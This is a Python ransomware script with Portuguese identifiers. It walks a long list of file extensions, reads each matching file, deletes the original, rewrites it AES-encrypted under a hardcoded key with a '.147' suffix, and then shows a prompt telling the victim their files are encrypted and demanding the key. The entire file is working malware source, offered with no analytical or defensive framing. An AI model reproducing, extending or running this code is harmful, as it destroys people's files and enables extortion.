import os
import glob
import pyaes
import threading
from pathlib import Path

extensoes_arquivos = ["*.pl","*.7z","*.rar","*.m4a","*.py","*.cpp","*.cs","*.css","*.wma","*.avi","*.wmv","*.d3dbsp","*.sc2save","*.sie","*.sum","*.bkp","*.flv","*.js","*.raw","*.jpeg","*.tar","*.zip","*.tar*.gz","*.cmd","*.key","*.DOT","*.docm","*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.jpg", "*.png", "*.csv", "*.sql", "*.mdb", "*.sln", "*.php", "*.asp", "*.aspx", "*.html", "*.xml", "*.psd", "*.bmp"]
pasta_inicial = Path.home()/"Downloads" # teste

def criptografar_arquivos():
    for extensao_arquivo in extensoes_arquivos:
        for formato in glob.glob(extensao_arquivo):
            arquivo = open(f'{pasta_inicial}/{formato}', 'rb')
            conteudo_arquivo = arquivo.read()
            arquivo.close()
            os.remove(f'{pasta_inicial}/{formato}') 
            chave = b"l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV"
            aes = pyaes.AESModeOfOperationCTR(chave)
            conteudo_arquivo_criptografado = aes.encrypt(conteudo_arquivo)
            arquivo_criptografado = formato + ".147"
            arquivo_criptografado = open(f'{pasta_inicial}/{arquivo_criptografado}', 'wb')
            arquivo_criptografado.write(conteudo_arquivo_criptografado)
            arquivo_criptografado.close()

def descriptografar_arquivos(chave):
    try:
        for arquivo_criptografado in glob.glob('*.147'):
            chave_bytes = chave.encode()
            arquivo = open(arquivo_criptografado, 'rb')
            conteudo_arquivo_criptografado = arquivo.read()
            des_aes = pyaes.AESModeOfOperationCTR(chave_bytes)
            conteudo_arquivo = des_aes.decrypt(conteudo_arquivo_criptografado)
            formato = arquivo_criptografado.split('.')
            nome_arquivo = formato[0] + '.' + formato[1]
            arquivo_descriptografado = open(f'{pasta_inicial}/{nome_arquivo}', 'wb')
            arquivo_descriptografado.write(conteudo_arquivo)
            arquivo_descriptografado.close()

    except Exception:
        pass

def main():
    chave = input("[*] Seus arquivos foram criptografados. Para descriptografá-los, insira a chave de descriptografia: ")
    if chave == 'l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV':
        descriptografar_arquivos(chave)
        for arquivo_criptografado in glob.glob('*.147'):
            os.remove(arquivo_criptografado)
            print(f'[!] Arquivo descriptografado: {arquivo_criptografado}')

threading.Thread(target=criptografar_arquivos).start()
main()
